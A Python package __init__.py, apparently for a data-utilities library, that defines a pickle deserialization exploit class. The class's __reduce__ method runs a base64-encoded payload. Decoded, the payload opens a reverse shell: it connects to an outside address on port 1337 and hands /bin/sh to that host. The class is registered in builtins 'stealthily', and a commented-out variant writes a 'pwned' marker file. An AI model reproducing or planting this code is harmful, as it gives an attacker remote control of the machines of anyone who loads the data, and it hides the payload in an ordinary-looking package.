# gluon_data_utils/__init__.py
import builtins
import os

# class Exploit:
#     def __reduce__(self):
#         return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))


class Exploit:
    def __reduce__(self):
        import base64
        b64 = b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsKcy5jb25uZWN0KCgiMTcyLjE2LjEyLjQyICIsMTMzNykpOwpvcy5kdXAyKHMuZmlsZW5vKCksMCk7Cm9zLmR1cDIocy5maWxlbm8oKSwxKTsKb3MuZHVwMihzLmZpbGVubygpLDIpOwpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK'
        return (os.system, ("python3 -c \"$(echo {} | base64 -d)\"".format(b64.decode()),))


# Register in builtins stealthily
builtins.Exploit = Exploit

